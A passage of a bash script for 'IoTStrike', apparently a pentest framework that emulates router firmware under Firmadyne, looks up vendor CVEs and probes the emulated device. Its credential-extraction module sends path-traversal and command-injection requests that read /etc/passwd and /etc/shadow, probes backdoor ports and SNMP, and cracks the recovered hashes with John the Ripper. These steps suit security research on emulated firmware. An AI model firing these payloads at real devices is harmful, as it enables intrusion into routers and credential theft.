    [[ $found -eq 0 ]] && echo -e "  ${BLD}Background jobs:${RST} none"
}
hdr()  { echo -e "\n${B}${C}  ╔══ $* ══╗${RST}"; }

BASE_DIR="/opt/iotstrike"
FIRM_DIR="$BASE_DIR/firmadyne"
SESSION_FILE="$BASE_DIR/.session.env"
DB_USER="firmadyne"; DB_NAME="firmware"
NON_INTERACTIVE=false

# ── Session state ─────────────────────────────────────────────────────────────
# Session files are KEY="VALUE" text files.  They are NEVER sourced/executed —
# values are extracted with grep+cut and whitelist-validated to prevent a
# malicious or corrupted session file from running arbitrary commands as root.

_session_read_key() {
    # Usage: _session_read_key KEY FILE [DEFAULT]
    # Reads KEY="VALUE" from FILE, strips quotes, whitelist-validates, returns value.
    local key="$1" file="$2" default="${3:-}"
    local val
    val=$(grep -m1 "^${key}=" "$file" 2>/dev/null \
        | cut -d'=' -f2- | tr -d '"' | tr -d "'" | head -c 256)
    # Whitelist: alphanumeric, path separators / . _ - space and colon (for IPs/ports)
    if [[ "$val" =~ ^[A-Za-z0-9/_.\ :\-]*$ ]]; then
        echo "${val:-$default}"
    else
        echo "$default"
    fi
}

_load_session() {
    SESSION_NAME="none"; FW_PATH="none";    VENDOR="unknown"
    TARGET_IP="none";    FW_ARCH="unknown"; EMULATOR="none"
    SCAN_LOG="none";     QEMU_SESSION="none"; QEMU_TOOL="none"
    [[ ! -f "$SESSION_FILE" ]] && return
    SESSION_NAME="$(_session_read_key  SESSION_NAME  "$SESSION_FILE" none)"
    FW_PATH="$(_session_read_key       FW_PATH       "$SESSION_FILE" none)"
    VENDOR="$(_session_read_key        VENDOR        "$SESSION_FILE" unknown)"
    TARGET_IP="$(_session_read_key     TARGET_IP     "$SESSION_FILE" none)"
    FW_ARCH="$(_session_read_key       FW_ARCH       "$SESSION_FILE" unknown)"
    EMULATOR="$(_session_read_key      EMULATOR      "$SESSION_FILE" none)"
    SCAN_LOG="$(_session_read_key      SCAN_LOG      "$SESSION_FILE" none)"
    QEMU_SESSION="$(_session_read_key  QEMU_SESSION  "$SESSION_FILE" none)"
    QEMU_TOOL="$(_session_read_key     QEMU_TOOL     "$SESSION_FILE" none)"
}

_save_session() {
    cat > "$SESSION_FILE" << SEOF
SESSION_NAME="${SESSION_NAME:-none}"
FW_PATH="${FW_PATH:-none}"
VENDOR="${VENDOR:-unknown}"
TARGET_IP="${TARGET_IP:-none}"
FW_ARCH="${FW_ARCH:-unknown}"
EMULATOR="${EMULATOR:-none}"
SCAN_LOG="${SCAN_LOG:-none}"
QEMU_SESSION="${QEMU_SESSION:-none}"
QEMU_TOOL="${QEMU_TOOL:-none}"
SEOF
    # Export session vars so Python child process can read them via os.environ
    export TARGET_IP VENDOR FW_ARCH EMULATOR SESSION_NAME SCAN_LOG FW_PATH \
           QEMU_SESSION QEMU_TOOL
    # Update web dashboard status.json
    python3 - << PYEOF
import json, os, subprocess
d = {
    "target_ip": os.environ.get("TARGET_IP", "none"),
    "vendor": os.environ.get("VENDOR", "unknown"),
    "arch": os.environ.get("FW_ARCH", ""),
    "emulator": os.environ.get("EMULATOR", ""),
    "ports": [], "cves": [], "scan_summary": "Session: " + os.environ.get("SESSION_NAME","none")
}
# parse nmap log if exists
nmap_log = os.environ.get("SCAN_LOG", "none")
if nmap_log != "none" and os.path.exists(nmap_log):
    with open(nmap_log) as f:
        content = f.read()
    ports = []
    for line in content.split("\n"):
        if "/tcp" in line and "open" in line:
            parts = line.split()
            if parts: ports.append(parts[0])
    d["ports"] = ports[:12]
    d["scan_summary"] = content[:800]
# parse CVE log if exists
cve_log = "/opt/iotstrike/logs/cve_" + os.environ.get("VENDOR","unknown") + "_latest.json"
if os.path.exists(cve_log):
    try:
        with open(cve_log) as f:
            cdata = json.load(f)
        cves = []
        for v in cdata.get("vulnerabilities", [])[:8]:
            c = v["cve"]
            m = c.get("metrics", {})
            score = "N/A"
            if "cvssMetricV31" in m:
                score = str(m["cvssMetricV31"][0]["cvssData"]["baseScore"])
            elif "cvssMetricV30" in m:
                score = str(m["cvssMetricV30"][0]["cvssData"]["baseScore"])
            elif "cvssMetricV2" in m:
                score = str(m["cvssMetricV2"][0]["cvssData"]["baseScore"])
            cves.append({"id": c["id"], "score": score})
        d["cves"] = cves
    except: pass
import os, tempfile
_dst = "/opt/iotstrike/web/status.json"
_tmp = _dst + ".tmp"
with open(_tmp, "w") as f:
    json.dump(d, f, indent=2)
os.replace(_tmp, _dst)   # atomic on Linux — web UI never reads a partial file
PYEOF
}

_status_bar() {
    echo ""
    sep
    echo -e "  ${B}Active session:${RST} ${SESSION_NAME:-none}  |  ${B}Target:${RST} ${TARGET_IP:-none}  |  ${B}Vendor:${RST} ${VENDOR:-?}  |  ${B}Arch:${RST} ${FW_ARCH:-?}"
    sep
}

# ── Ephemeral cleanup — runs on exit, Ctrl-C, Ctrl-Z, or terminal close ───────
_cleanup() {
    rm -f "$SESSION_FILE" 2>/dev/null || true
    kill $(jobs -p 2>/dev/null) 2>/dev/null || true
    pkill -P $$ 2>/dev/null || true
    echo -e "\n  ${CYN}[*]${RST} Session wiped and background tasks terminated."
}
trap '_cleanup; exit' SIGINT SIGTERM SIGHUP SIGTSTP

# ── Pre-run cleanup ───────────────────────────────────────────────────────────
info "Cleaning up stale processes and tap interfaces..."
pkill -f qemu-system-mips 2>/dev/null || true
pkill -f qemu-system-arm  2>/dev/null || true
for tap in tap0 tap1_0 tap1_1 tap2_0 tap3_0; do
    ip link delete "$tap" 2>/dev/null || true
done
service postgresql start 2>/dev/null || service postgresql restart 2>/dev/null || true
sleep 1
source "$BASE_DIR/tools/bin/activate" 2>/dev/null || { fail "Python venv missing. Re-run setup."; exit 1; }
export PATH="$BASE_DIR/tools/bin:$PATH"
_load_session

# ── Banner ────────────────────────────────────────────────────────────────────
clear
echo -e "${B}${C}"
figlet -f slant "IoTStrike" 2>/dev/null || echo "  IoTStrike"
echo -e "${RST}"
_status_bar

# =============================================================================
# MODULE 1 — Emulate firmware
# =============================================================================
_emulate_menu() {
    hdr "Firmware Emulation"
    echo ""
    echo -e "  Select emulator:"
    echo -e "    ${B}[1]${RST} Firmadyne          ${C}(MIPS/ARM QEMU — detached session)${RST}"
    echo -e "    ${B}[2]${RST} FirmAE             ${C}(Docker-based, higher success rate)${RST}"
    echo -e "    ${B}[3]${RST} EMBA               ${C}(static analysis only, no network)${RST}"
    echo -e "    ${B}[4]${RST} Attach to console  ${C}(reconnect to running QEMU: ${QEMU_SESSION:-none})${RST}"
    echo -e "    ${B}[b]${RST} Back"
    echo ""
    IFS= read -r -e -p "  Select [1-4/b]: " emu_choice
    case "$emu_choice" in
        1|"") _run_firmadyne ;;
        2)    _run_firmae ;;
        3)    _run_emba ;;
        4)    _qemu_attach ;;
        b|B)  return ;;
        *)    warn "Invalid selection"; _emulate_menu ;;
    esac
}

_firmware_select() {
    # Non-interactive shortcut: FW_PATH already set via --emulate flag — skip scanning/prompts
    if ! ( [[ -n "$FW_PATH" && "$FW_PATH" != "none" && -f "$FW_PATH" ]] ); then
        echo ""
        info "Scanning for firmware files..."
        local DIRS=("$HOME/Desktop" "$HOME/Downloads" "$HOME" "/tmp" "$(pwd)")
        local EXTS=("*.tar" "*.tar.gz" "*.bin" "*.img" "*.zip" "*.trx" "*.chk" "*.dlf" "*.w")
        mapfile -t CANDS < <(
            for d in "${DIRS[@]}"; do [[ -d "$d" ]] || continue
                for e in "${EXTS[@]}"; do find "$d" -maxdepth 2 -name "$e" -type f 2>/dev/null; done
            done | sort -u
        )
        if [[ ${#CANDS[@]} -eq 0 ]]; then
            warn "No firmware found. Enter path manually."
            IFS= read -r -e -p "  Full path to firmware: " FW_PATH
        elif [[ ${#CANDS[@]} -eq 1 ]]; then
            ok "Found: ${CANDS[0]}"
            IFS= read -r -e -p "  Press Enter to use it, or type different path: " FW_OVERRIDE
            FW_PATH="${FW_OVERRIDE:-${CANDS[0]}}"
        else
            echo ""
            echo -e "  ${C}Found ${#CANDS[@]} firmware files:${RST}"
            for i in "${!CANDS[@]}"; do printf "    ${B}[%d]${RST} %s\n" "$((i+1))" "${CANDS[$i]}"; done
            echo -e "    ${B}[m]${RST} Enter manually"
            echo ""
            IFS= read -r -e -p "  Select [1-${#CANDS[@]}/m]: " SEL
            if [[ "$SEL" == "m" || -z "$SEL" ]]; then
                IFS= read -r -e -p "  Full path: " FW_PATH
            elif [[ "$SEL" =~ ^[0-9]+$ ]] && (( SEL >= 1 && SEL <= ${#CANDS[@]} )); then
                FW_PATH="${CANDS[$((SEL-1))]}"
            else fail "Invalid selection"; return 1; fi
        fi
        # Sanitise
        FW_PATH="${FW_PATH%"${FW_PATH##*[![:space:]]}"}"
        FW_PATH="${FW_PATH%\"}"; FW_PATH="${FW_PATH#\"}"
        FW_PATH="${FW_PATH/#\~/$HOME}"
        FW_PATH="$(realpath -e "$FW_PATH" 2>/dev/null || echo "$FW_PATH")"
        [[ ! -f "$FW_PATH" ]] && { fail "File not found: $FW_PATH"; return 1; }
    fi
    ok "Firmware: $FW_PATH"

    # Vendor detection (runs in both interactive and non-interactive mode)
    local BASE; BASE=$(basename "$FW_PATH" | tr '[:upper:]' '[:lower:]')
    VENDOR=""
    declare -A VMAP=(
        ["netgear"]="netgear" ["wnap"]="netgear" ["wndr"]="netgear" ["dlink"]="dlink"
        ["dir-"]="dlink"      ["tplink"]="tplink" ["tp-link"]="tplink" ["archer"]="tplink"
        ["asus"]="asus"       ["rt-"]="asus"      ["linksys"]="linksys" ["wrt"]="linksys"
        ["draytek"]="draytek" ["vigor"]="draytek" ["belkin"]="belkin" ["buffalo"]="buffalo"
        ["zyxel"]="zyxel"     ["huawei"]="huawei" ["mikrotik"]="mikrotik"
        ["cisco"]="cisco"     ["ubiquiti"]="ubiquiti" ["unifi"]="ubiquiti"
    )
    for p in "${!VMAP[@]}"; do [[ "$BASE" == *"$p"* ]] && { VENDOR="${VMAP[$p]}"; break; }; done
    echo ""
    if [[ -n "$VENDOR" ]]; then
        ok "Auto-detected vendor: ${B}$VENDOR${RST}"
        if ! $NON_INTERACTIVE; then
            IFS= read -r -e -p "  Press Enter to confirm or type different vendor: " V_OVR
            VENDOR="${V_OVR:-$VENDOR}"
        fi
    else
        if $NON_INTERACTIVE; then
            warn "Vendor not detected from filename — using 'unknown'"
        else
            warn "Vendor not detected from filename."
            IFS= read -r -e -p "  Enter vendor (e.g. netgear, dlink, asus): " VENDOR
        fi
    fi
    VENDOR="${VENDOR:-unknown}"
    ok "Vendor: ${B}$VENDOR${RST}"

    # Auto CVE alert on vendor detection
    _cve_background_check "$VENDOR"
}

_cve_background_check() {
    local v="$1"
    (
        sleep 2
        local log="$BASE_DIR/logs/cve_${v}_latest.json"
        # Normalise vendor name for NVD
        local nvd_v="$v"
        case "${v,,}" in
            tplink|tp_link) nvd_v="tp-link" ;;
            dlink|d_link)   nvd_v="d-link" ;;
            ubiquiti|unifi) nvd_v="ubiquiti" ;;
        esac
        local all_url="https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${nvd_v}&resultsPerPage=20"
        if curl -s --max-time 25 -H "Accept: application/json" "$all_url" -o "$log" 2>/dev/null; then
            local count high_count
            local PYSC2; PYSC2=$(mktemp /tmp/cve_count_XXXXXX.py)
            cat > "$PYSC2" << 'COUNTPY'
import json, sys
try:
    d = json.load(open(sys.argv[1]))
    vulns = d.get('vulnerabilities', [])
    high = [v for v in vulns if float(
        ((v['cve'].get('metrics', {}).get('cvssMetricV31') or [{}])[0]
         .get('cvssData', {}).get('baseScore', 0)) or 0) >= 8]
    print(str(len(vulns)) + ' ' + str(len(high)))
except Exception:
    print('0 0')
COUNTPY
            count=$(python3 "$PYSC2" "$log" 2>/dev/null || echo "0 0")
            rm -f "$PYSC2"
            total_c=$(echo "$count" | cut -d' ' -f1)
            high_c=$(echo "$count"  | cut -d' ' -f2)
            if [[ "$total_c" -gt 0 ]]; then
                echo ""
                if [[ "$high_c" -gt 0 ]]; then
                    echo -e "  ${R}${B}[⚠] CVE ALERT: $high_c HIGH/CRITICAL CVE(s) (CVSS≥8) found for vendor: $v${RST}"
                    echo -e "  ${R}${B}    $total_c total CVEs — run Option [3] CVE Intelligence for full details${RST}"
                else
                    echo -e "  ${Y}[!] $total_c CVE(s) found for $v — run Option [3] CVE Intelligence${RST}"
                fi
            fi

            # Mode 4: grep firmware filesystem for vulnerable component keywords
            local scratch_dir="$BASE_DIR/firmadyne/images"
            if [[ -d "$scratch_dir" ]]; then
                local PYSC; PYSC=$(mktemp /tmp/cve_fs_XXXXXX.py)
                cat > "$PYSC" << 'INNERPY'
import json, os, subprocess, sys
try:
    data = json.load(open(sys.argv[1]))
    vulns = data.get('vulnerabilities', [])
    keywords = set()
    for v in vulns:
        desc = v['cve']['descriptions'][0]['value'].lower()
        for word in desc.split():
            if len(word) > 4 and word.isalpha() \
               and word not in ('router', 'firmware', 'allows', 'could', 'remote'):
                keywords.add(word)
    keywords = list(keywords)[:8]
    hits = []
    for root, dirs, files in os.walk(sys.argv[2]):
        for fname in files:
            fp = os.path.join(root, fname)
            try:
                for kw in keywords:
                    r = subprocess.run(['grep', '-lri', kw, fp],
                                       capture_output=True, timeout=2)
                    if r.returncode == 0:
                        hits.append(fp + ':' + kw)
                        break
            except Exception:
                pass
        if len(hits) >= 3:
            break
    for h in hits[:3]:
        print('  FS match: ' + h)
except Exception:
    pass
INNERPY
                local fs_hits
                fs_hits=$(python3 "$PYSC" "$log" "$scratch_dir" 2>/dev/null || true)
                rm -f "$PYSC"
                if [[ -n "$fs_hits" ]]; then
                    echo -e "  ${R}[⚠] Vulnerable keywords found in firmware filesystem:${RST}"
                    echo "$fs_hits"
                fi
            fi
        fi
    ) &
}

# =============================================================================
# ACE — Automated Credential Extractor
# Auto-fires the moment the target IP goes LIVE.
# Vectors: FS scan · backdoor ports · HTTP/S path traversal · SNMP
# Output:  /opt/iotstrike/logs/extracted_creds.txt
# =============================================================================
_extract_credentials() {
    local tgt="${1:-${TARGET_IP:-192.168.0.100}}"
    local out_file="$BASE_DIR/logs/extracted_creds.txt"
    local shadow_found=false cred_found=false

    {
        echo "═══════════════════════════════════════════════════════"
        echo " IoTStrike ACE — Automated Credential Extractor"
        echo " Date  : $(date)"
        echo " Target: $tgt"
        echo "═══════════════════════════════════════════════════════"
        echo ""
    } > "$out_file"

    # ── Vector 1: Filesystem scan — extract /etc/passwd + /etc/shadow ─────
    # Firmadyne stores extracted images as tar.gz in $FIRM_DIR/images/
    local _fw_tar; _fw_tar=$(ls -t "$FIRM_DIR/images/"*.tar.gz 2>/dev/null | head -1 || true)
    if [[ -n "$_fw_tar" ]]; then
        info "[ACE] Scanning extracted firmware FS for credentials..."
        local _etc_passwd _etc_shadow
        _etc_passwd=$(tar -xOf "$_fw_tar" \
            $(tar -tzf "$_fw_tar" 2>/dev/null | grep -E "^[./]*etc/passwd$" | head -1) \
            2>/dev/null | head -40 || true)
        _etc_shadow=$(tar -xOf "$_fw_tar" \
            $(tar -tzf "$_fw_tar" 2>/dev/null | grep -E "^[./]*etc/shadow$" | head -1) \
            2>/dev/null | head -40 || true)
        if [[ -n "$_etc_passwd" ]]; then
            { echo "── /etc/passwd (from firmware FS) ──"
              echo "$_etc_passwd"; echo ""; } >> "$out_file"
            cred_found=true
        fi
        if [[ -n "$_etc_shadow" ]]; then
            { echo "── /etc/shadow (from firmware FS) ──"
              echo "$_etc_shadow"; echo ""; } >> "$out_file"
            shadow_found=true; cred_found=true
        fi
    fi

    # ── Vector 2: Backdoor port probe ──────────────────────────────────────
    if command -v nc &>/dev/null; then
        for _bport in 32764 9999 2323 23; do
            local _banner
            _banner=$(echo -e "\r\n" | nc -w 3 "$tgt" "$_bport" 2>/dev/null \
                      | strings | head -10 || true)
            if [[ -n "$_banner" ]]; then
                { echo "── Backdoor/service banner — port ${_bport} ──"
                  echo "$_banner"; echo ""; } >> "$out_file"
                echo -e "  ${R}[ACE] Open backdoor port ${_bport} on ${tgt}${RST}"
                cred_found=true
            fi
        done
    fi

    # ── Vector 3: SNMP community walk ──────────────────────────────────────
    if command -v snmpwalk &>/dev/null; then
        local _snmp
        _snmp=$(snmpwalk -v2c -c public -t 3 "$tgt" 2>/dev/null | head -40 || true)
        if [[ -n "$_snmp" ]]; then
            { echo "── SNMP walk (community: public) ──"
              echo "$_snmp"; echo ""; } >> "$out_file"
            cred_found=true
        fi
    fi

    # ── Vector 4: HTTP/S path traversal (Netgear + generic) ───────────────
    local _trav_paths=(
        # Generic traversal
        "/cgi-bin/../../../../etc/passwd"
        "/../../../etc/passwd"
        "/.htpasswd"
        "/config/getuser?index=0"
        # Netgear — authentication bypass / command injection
        "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=cat+/etc/passwd"
        "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=cat+/etc/shadow"
        "/boardDataWW.php?writeData=1&macAddress=;cat+/etc/passwd;"
        "/currentsetting.htm"
        "/passwordrecovered.cgi"
        # D-Link
        "/getcfg.php"
        "/cgi-bin/admin.cgi?path=../../../../etc/passwd"
    )
    for _proto in http https; do
        for _path in "${_trav_paths[@]}"; do
            local _resp
            _resp=$(wget -qO- --timeout=4 --no-check-certificate \
                "${_proto}://${tgt}${_path}" 2>/dev/null | head -30 || true)
            if echo "$_resp" | grep -qE "^root:|nobody:|admin:|^\w+:\$[0-9y]\$" 2>/dev/null; then
                { echo "── ${_proto^^} path traversal — ${_path} ──"
                  echo "$_resp"; echo ""; } >> "$out_file"
                echo -e "  ${R}${B}[ACE] Credentials via ${_proto^^} traversal: ${_path}${RST}"
                echo "$_resp" | grep -qE ":\$[0-9y]\$" && shadow_found=true
                cred_found=true
                break 2
            fi
        done
    done

    # ── Result ─────────────────────────────────────────────────────────────
    { echo ""; echo "═══ ACE COMPLETE — $(date) ═══"; } >> "$out_file"
    if $cred_found; then
        echo -e "\n  ${R}${B}[⚠] CREDENTIAL DATA EXTRACTED → $out_file${RST}"
        export SCAN_LOG="$out_file"
        _save_session 2>/dev/null || true
        # Auto-crack if shadow hashes were found
        if $shadow_found; then
            echo -e "  ${Y}[ACE] Shadow hashes found — launching hash cracker...${RST}"
            _crack_credentials "$out_file"
        fi
    else
        echo "No credentials extracted." >> "$out_file"
        echo -e "  ${C}[ACE] No credentials auto-extracted — try manual path traversal${RST}"
    fi
}

# =============================================================================
# Hash Cracking Module
# Auto-fires when ACE finds /etc/shadow entries.
# Uses John the Ripper with auto-detected hash format.
# =============================================================================
_crack_credentials() {
    local cred_file="${1:-$BASE_DIR/logs/extracted_creds.txt}"
    local crack_out="$BASE_DIR/logs/cracked_passwords.txt"
    local shadow_tmp; shadow_tmp=$(mktemp /tmp/iotstrike_shadow_XXXXXX.txt)

    if ! command -v john &>/dev/null; then
        warn "John the Ripper not found — install: apt-get install john"
        rm -f "$shadow_tmp"; return
    fi

    # Pull shadow-format lines from the credential dump
    grep -E "^\w+:\$[0-9y]\$[^\s]+" "$cred_file" > "$shadow_tmp" 2>/dev/null || true
    if [[ ! -s "$shadow_tmp" ]]; then
        warn "[crack] No crackable hash format detected in credential file."
        rm -f "$shadow_tmp"; return
    fi

    # Auto-detect the dominant hash format
    local _fmt=""
    if   grep -qE ":\$6\$" "$shadow_tmp"; then _fmt="--format=sha512crypt"
    elif grep -qE ":\$5\$" "$shadow_tmp"; then _fmt="--format=sha256crypt"
    elif grep -qE ":\$y\$"  "$shadow_tmp"; then _fmt="--format=yescrypt"
    elif grep -qE ":\$1\$"  "$shadow_tmp"; then _fmt="--format=md5crypt"
    fi

    info "[crack] Format: ${_fmt:-auto}  |  Hashes: $(wc -l < "$shadow_tmp")  |  Wordlist: passwords.txt"

    john $_fmt \
        --wordlist="$BASE_DIR/wordlists/passwords.txt" \
        "$shadow_tmp" >> "$crack_out" 2>/dev/null &
    local _JOHN_PID=$!
    _track_job "$_JOHN_PID" "John the Ripper — cracking hashes from ACE"

    ok "[crack] John started (PID $_JOHN_PID) — checking for quick wins (60s)..."

    # Poll for results for up to 60 seconds then report whatever john found
    local _t=0
    while kill -0 "$_JOHN_PID" 2>/dev/null && [[ $_t -lt 60 ]]; do
        sleep 5; _t=$(( _t + 5 ))
        john --show "$shadow_tmp" 2>/dev/null \
            | grep -v "^0 password" | head -5 \
            | while IFS= read -r _line; do
                echo -e "  ${G}[crack] ${_line}${RST}"
              done
    done

    local _results; _results=$(john --show "$shadow_tmp" 2>/dev/null | grep -v "^0 password" || true)
    if [[ -n "$_results" ]]; then
        {
            echo "═══ CRACKED PASSWORDS ══════════════════════════════"
            echo "$_results"
            echo "════════════════════════════════════════════════════"
        } >> "$crack_out"
        echo ""
        echo -e "  ${R}${B}╔══ CRACKED CREDENTIALS ═════════════════════════════╗${RST}"
        echo "$_results" | while IFS= read -r _l; do
            echo -e "  ${R}${B}  $_l${RST}"
        done
        echo -e "  ${R}${B}╚═════════════════════════════════════════════════════╝${RST}"
        echo ""
        export SCAN_LOG="$crack_out"
        _save_session 2>/dev/null || true
    else
        warn "[crack] No passwords cracked with current wordlist."
        info "Manual: john --wordlist=/usr/share/wordlists/rockyou.txt $shadow_tmp"
    fi
    rm -f "$shadow_tmp"
}

_run_firmadyne() {
    _firmware_select || return
    EMULATOR="firmadyne"

    # Pre-extract zip — recursive so nested vendor-wrapper zips (e.g. wnap_.zip → wnap.zip → firmware.tar)
    # are fully unwrapped before handing off to firmadyne's extractor
    local ZIP_TMP=""
    if [[ "${FW_PATH,,}" == *.zip ]]; then
        info "Pre-extracting zip (recursive)..."
        ZIP_TMP=$(mktemp -d /tmp/fw_zip_XXXXXX)
        local _cur="$FW_PATH" _depth=0
        while [[ "${_cur,,}" == *.zip ]] && (( _depth < 5 )); do
            local _lvl="$ZIP_TMP/lvl${_depth}"
            mkdir -p "$_lvl"
            if ! unzip -q "$_cur" -d "$_lvl" 2>/dev/null; then
                warn "unzip failed at depth $_depth — using last good file"
                break
            fi
            local _next; _next=$(find "$_lvl" -type f -printf "%s %p\n" 2>/dev/null \
                | sort -rn | head -1 | awk '{print $2}')
            [[ -z "$_next" ]] && { fail "Empty archive at depth $_depth"; rm -rf "$ZIP_TMP"; return 1; }
            ok "  Level $_depth: $(basename "$_next")"
            _cur="$_next"
            _depth=$(( _depth + 1 ))
        done
        [[ ! -f "$_cur" ]] && { fail "Could not extract firmware from zip"; rm -rf "$ZIP_TMP"; return 1; }
        FW_PATH="$_cur"; ok "Extracted firmware: $FW_PATH"
    fi

    # ── Magic-number fingerprinting ────────────────────────────────────────────
    # Read 4 bytes; fall back to od if xxd is absent
    local _MAGIC _MIME _FW_TAG
    _MAGIC=$(xxd -l 4 -p "$FW_PATH" 2>/dev/null \
          || od -A n -t x1 -N 4 "$FW_PATH" 2>/dev/null | tr -d ' \n' \
          || echo "00000000")
    _MAGIC="${_MAGIC^^}"   # uppercase hex

    case "$_MAGIC" in
        68737173*)   # 'hsqs' — SquashFS little-endian
            _FW_TAG="SquashFS (Linux-Based)"
            ok "Magic: ${GRN}SquashFS filesystem — High Exploitability${RST}" ;;
        73717368*)   # 'sqsh' — SquashFS big-endian
            _FW_TAG="SquashFS BE (Linux-Based)"
            ok "Magic: ${GRN}SquashFS big-endian — High Exploitability${RST}" ;;
        27051956*)   # U-Boot image
            _FW_TAG="U-Boot Bootable OS Image"
            ok "Magic: ${YEL}U-Boot image — Bootable OS${RST}" ;;
        1F8B*)       # gzip
            _FW_TAG="gzip (Linux kernel / initramfs)"
            ok "Magic: gzip compressed image" ;;
        504B0304*)   # ZIP
            _FW_TAG="ZIP archive"
            ok "Magic: ZIP archive" ;;
        *)
            _FW_TAG="Binary blob"
            info "Magic bytes: ${_MAGIC} — proceeding with extraction" ;;
    esac

    # MIME type safety gate — abort if this is plainly a shell script
    _MIME=$(file --mime-type -b "$FW_PATH" 2>/dev/null || echo "application/octet-stream")
    if [[ "$_MIME" == "text/x-shellscript" || "$_MIME" == "text/plain" ]]; then
        fail "File identified as '${_MIME}' — this is a script, not firmware."
        warn "Provide a binary firmware image (.bin/.img/.tar.gz/.zip)"
        [[ -n "$ZIP_TMP" ]] && rm -rf "$ZIP_TMP"
        IFS= read -r -e -p "  Press Enter to continue..."; return 1
    fi
    ok "MIME: ${_MIME}  |  Tag: ${_FW_TAG}"

    cd "$FIRM_DIR"
    mkdir -p images logs

    # ── Flush stale Firmadyne DB — TRUNCATE resets sequences, avoids UniqueViolation ──
    info "Flushing Firmadyne database..."
    sudo -u postgres psql -d "${DB_NAME:-firmware}" -qc \
        "TRUNCATE image, object_to_image RESTART IDENTITY CASCADE;" \
        2>/dev/null && ok "Database flushed" \
        || warn "DB flush had warnings — continuing anyway"

    sep; echo -e "  ${B}Firmware Extraction Pipeline${RST}"; sep; echo ""

    info "Extracting firmware filesystem..."
    local EXT_OUT; EXT_OUT=$(python3 ./sources/extractor/extractor.py \
        -b "$VENDOR" -sql 127.0.0.1 -np -nk "$FW_PATH" images 2>&1)
    echo "$EXT_OUT" | grep -E "^(>>|WARNING|ERROR)" | head -20

    # Abort early if the extractor itself says the file is a script
    if echo "$EXT_OUT" | grep -qi "text/x-shellscript\|not a valid\|unsupported file"; then
        fail "Extractor rejected the file — not a valid firmware image"
        [[ -n "$ZIP_TMP" ]] && rm -rf "$ZIP_TMP"
        IFS= read -r -e -p "  Press Enter to continue..."; return 1
    fi

    local TAG_ID=""
    TAG_ID=$(echo "$EXT_OUT" | grep -oP "(?i)(?<=database image id:\s)\d+" | tail -1 || true)
    [[ -z "$TAG_ID" ]] && TAG_ID=$(echo "$EXT_OUT" | grep -oP "\b[0-9]+\b" | tail -1 || true)
    if [[ -z "$TAG_ID" ]]; then
        fail "Could not get Tag ID — check extractor output above"
        [[ -n "$ZIP_TMP" ]] && rm -rf "$ZIP_TMP"; return 1
    fi
    ok "Tag ID: ${B}$TAG_ID${RST}"

    local TIMESTAMP; TIMESTAMP=$(date +%Y%m%d_%H%M%S)
    local RUN_LOG="$BASE_DIR/logs/run_id${TAG_ID}_${TIMESTAMP}.log"
    SCAN_LOG="$BASE_DIR/logs/nmap_${VENDOR}_${TIMESTAMP}.txt"

    info "Detecting CPU architecture..."
    set +e; bash scripts/getArch.sh "images/${TAG_ID}.tar.gz"; set -e
    FW_ARCH=$(sudo -u postgres psql -d "$DB_NAME" -t -c \
        "SELECT architecture FROM image WHERE id=${TAG_ID};" 2>/dev/null \
        | tr -d ' \n') || FW_ARCH=""
    ok "Architecture: ${B}${FW_ARCH:-unknown}${RST}"

    info "Inserting into database..."
    python3 scripts/tar2db.py -i "$TAG_ID" -f "images/${TAG_ID}.tar.gz"
    info "Building QEMU image..."
    set +e; bash scripts/makeImage.sh "$TAG_ID"; set -e; ok "Image built"

    info "60-second network inference probe..."
    set +e; bash scripts/inferNetwork.sh "$TAG_ID"; INFER_RC=$?; set -e
    [[ $INFER_RC -ne 0 ]] && warn "inferNetwork exited $INFER_RC — may still work"

    local RUN_SCRIPT="$FIRM_DIR/scratch/${TAG_ID}/run.sh"
    if [[ ! -f "$RUN_SCRIPT" ]]; then
        warn "run.sh not generated — building fallback for ${FW_ARCH:-unknown}..."
        local KERN QBIN MACH
        case "${FW_ARCH:-}" in
            mipseb) KERN="$FIRM_DIR/binaries/vmlinux.mipseb"; QBIN="qemu-system-mips"; MACH="malta" ;;
            mipsel) KERN="$FIRM_DIR/binaries/vmlinux.mipsel"; QBIN="qemu-system-mips"; MACH="malta" ;;
            armel)  KERN="$FIRM_DIR/binaries/zImage.armel";   QBIN="qemu-system-arm";  MACH="vexpress-a9" ;;
            *) fail "Unsupported arch: ${FW_ARCH:-empty}"; [[ -n "$ZIP_TMP" ]] && rm -rf "$ZIP_TMP"; return 1 ;;
        esac
        mkdir -p "$FIRM_DIR/scratch/${TAG_ID}"
        tee "$RUN_SCRIPT" > /dev/null << RUNEOF
#!/bin/bash
FIRMADYNE_DIR=/opt/iotstrike/firmadyne
IMAGE_ID=${TAG_ID}
ip tuntap add tap0 mode tap 2>/dev/null||true
ip link set tap0 up
ip addr add 192.168.0.1/24 dev tap0 2>/dev/null||true
${QBIN} -M ${MACH} -kernel ${KERN} \
    -drive if=ide,format=raw,file=\${FIRMADYNE_DIR}/scratch/\${IMAGE_ID}/image.raw \
    -append "root=/dev/sda1 console=ttyS0 nandsim.parts=64,64,64,64,64,64,64,64,64,64 rdinit=/firmadyne/preInit.sh rw debug ignore_loglevel print-fatal-signals=1 user_debug=31 firmadyne.syscall=1" \
    -nographic \
    -netdev tap,id=net0,ifname=tap0,script=no,downscript=no \
    -device e1000,netdev=net0
RUNEOF
        chmod +x "$RUN_SCRIPT"; ok "Fallback run.sh created"
    fi

    TARGET_IP="192.168.0.100"
    SESSION_NAME="${VENDOR}_${TIMESTAMP}"
    _save_session

    [[ -n "$ZIP_TMP" ]] && rm -rf "$ZIP_TMP"

    # Background poller — fires access banner when services come up
    (
        sleep 12
        FOUND=false
        for i in $(seq 1 55); do
            sleep 3
            if nc -z -w1 192.168.0.100 80  2>/dev/null || \
               nc -z -w1 192.168.0.100 22  2>/dev/null || \
               nc -z -w1 192.168.0.100 23  2>/dev/null || \
               nc -z -w1 192.168.0.100 443 2>/dev/null; then
                FOUND=true; break
            fi
        done
        echo ""
        echo ""
        echo -e "  ══════════════════════════════════════════════════════"
        if $FOUND; then
            echo -e "  ${G}${B}[✔] FIRMWARE IS UP — Services live on 192.168.0.100${RST}"
        else
            echo -e "  ${Y}[!] Timeout — firmware may still be initializing${RST}"
        fi
        echo -e "  ══════════════════════════════════════════════════════"
        echo -e "    ${C}Web:${RST}    http://192.168.0.100"
        echo -e "    ${C}SSH:${RST}    ssh admin@192.168.0.100"
        echo -e "    ${C}Telnet:${RST} telnet 192.168.0.100"
        echo ""
